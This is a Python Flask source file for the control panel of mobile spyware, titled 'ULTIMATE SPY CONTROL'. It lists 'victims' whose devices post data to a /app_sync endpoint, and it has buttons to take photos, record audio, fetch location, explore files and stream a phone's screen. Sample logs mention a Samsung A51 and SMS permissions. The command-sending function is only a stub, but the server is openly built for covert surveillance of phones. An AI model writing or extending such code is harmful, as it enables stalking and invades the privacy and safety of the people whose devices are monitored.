import os
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)
victims = {}

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>ULTIMATE SPY CONTROL</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: 'Segoe UI', sans-serif; display: flex; height: 100vh; margin: 0; }
        .sidebar { width: 300px; border-right: 1px solid #00ff41; padding: 20px; overflow-y: auto; }
        .main-content { flex-grow: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        
        /* ورچوئل موبائل اسکرین */
        .mobile-screen { 
            width: 320px; height: 600px; border: 15px solid #333; border-radius: 40px; 
            background: #000; position: relative; box-shadow: 0 0 30px #00ff41; overflow: hidden;
        }
        .screen-content { color: #fff; padding: 20px; font-size: 12px; }
        
        /* کنٹرول بٹنز */
        .controls { margin-top: 20px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; width: 100%; max-width: 400px; }
        button { 
            background: #00ff41; color: #000; border: none; padding: 10px; 
            font-weight: bold; cursor: pointer; border-radius: 5px; 
        }
        button:hover { background: #008f24; }
        .status-bar { width: 100%; background: #111; padding: 10px; text-align: center; border-bottom: 1px solid #333; }
        .log-box { width: 100%; height: 200px; background: #000; border: 1px solid #333; margin-top: 20px; overflow-y: scroll; padding: 10px; font-size: 11px; }
    </style>
    <script>
        function sendCommand(cmd) {
            alert("Command Sent: " + cmd);
            // یہاں سے ہم ایپ کو سگنل بھیجیں گے
        }
    </script>
</head>
<body>
    <div class="sidebar">
        <h2>🛰️ VICTIMS LIST</h2>
        <hr color="#00ff41">
        {% for id, data in victims.items() %}
        <div style="cursor:pointer; padding:10px; border:1px solid #333; margin-bottom:5px;">
            <b>{{ data.model }}</b><br><small>{{ id }}</small>
        </div>
        {% endfor %}
    </div>

    <div class="main-content">
        <div class="status-bar">LIVE REMOTE ACCESS - SESSION ACTIVE</div>
        
        <div class="mobile-screen">
            <div class="screen-content">
                <p>> Initializing Mirror...</p>
                <div id="live-stream" style="width:100%; height:100%; background:#222; display:flex; align-items:center; justify-content:center;">
                    [ LIVE SCREEN / CAMERA VIEW ]
                </div>
            </div>
        </div>

        <div class="controls">
            <button onclick="sendCommand('take_photo')">📸 TAKE PHOTO</button>
            <button onclick="sendCommand('record_mic')">🎙️ RECORD AUDIO</button>
            <button onclick="sendCommand('get_location')">📍 GET LOCATION</button>
            <button onclick="sendCommand('file_manager')">📁 FILE EXPLORER</button>
            <button onclick="sendCommand('live_screen')" style="grid-column: span 2; background: #ff0055; color: white;">🖥️ START LIVE SCREEN</button>
        </div>

        <div class="log-box">
            <strong>SYSTEM LOGS:</strong><br>
            [12:40:01] Connection established with Samsung A51...<br>
            [12:40:05] SMS Permissions Granted.<br>
            [12:40:10] Waiting for manual trigger...
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(ADMIN_HTML, victims=victims)

@app.route('/app_sync', methods=['POST'])
def sync():
    data = request.json
    dev_id = data.get("device_id", "Unknown")
    victims[dev_id] = data
    return jsonify({"status": "received"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
